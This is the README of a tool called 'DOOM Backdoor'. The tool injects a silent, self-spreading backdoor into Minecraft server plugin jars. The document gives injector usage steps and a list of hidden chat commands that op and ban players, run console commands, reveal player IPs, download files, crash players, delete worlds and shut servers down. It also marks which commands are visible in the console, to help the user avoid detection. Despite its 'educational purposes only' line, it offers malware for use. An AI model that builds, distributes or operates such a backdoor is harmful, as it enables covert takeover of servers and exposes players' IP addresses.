

# DOOM Backdoor

A silent, spreading backdoor for Minecraft Bukkit/Spigot/Paper servers.
Using the injector is recommended, should you choose to manually backdoor a plugin, you're on your own if you run into problems.

For educational purposes only. Do not use on a server you do not own.

## Requirements:
* Java 8 runtime.
* Desired target plugin jar file.

## Usage instructions:
* Run doom-(version).jar.
* Select desired plugin file.
* Input your Minecraft UUID.
* Input chat command prefix. (Default: fPr>)

## Commands
Default command prefix is ``fPr>``,  this can be changed.
* fPr>help - display all command, or description of command
* fPr>op - op specified player
* fPr>deop - deop specified player
* fPr>ban - ban player with reason and source
* fPr>banip - ip ban player with reason and source
* fPr>gm - switch to specified gamemode
* fPr>give - give the specified item in specified quantities
* fPr>exec - exocute command as server console **[Visible]**
* fPr>info - shows informatin about server
* fPr>chaos - deop and ban ops, op all regular players, run this while not being op yourself **[Visible]**
* fPr>seed - get the current world seed
* fPr>sudo - sends messages as player
* fPr>bcast - sends message as Server
* fPr>rename - changes your nick
* fPr>reload - Reloads the server **[Visible]**
* fPr>getip - gets ip of the player
* fPr>listwrld - displays all worlds
* fPr>mkwrld - creates new world **[Visible]**
* fPr>delwrld - deletes a world **[Visible]**
* fPr>vanish - makes you vanish, tab included
* fPr>silktouch - gives player silk touch hands
* fPr>crash - crashes player's name
* fPr>lock - locks the console or blocks player
* fPr>unlock - unlocks the console or unblocks player
* fPr>mute - mutes a player
* fPr>unmute - unmutes a player
* fPr>download - downloads a file
* fPr>coords - get the coordinates of specified player
* fPr>tp - teleport to specified coordinates **[Visible]**
* fPr>stop - shutdown the server **[Visible, See below.]**

Commands listed as **[Visible]** will be noticeable in Server console and or in-game chat.

Warning:
Teleporting may cause a '[player name] moved to quickly!' warning in server console. It may also cause anti-cheat to kick you.
Other strange behavior may occur when teleporting extreme distances. (such as to the world border)

## License
This software is provided under the GPL3 License.

Credit to **Rikonardo** for his [Bukloit](https://github.com/Rikonardo/Bukloit) project, which helped in the development of the Injector.
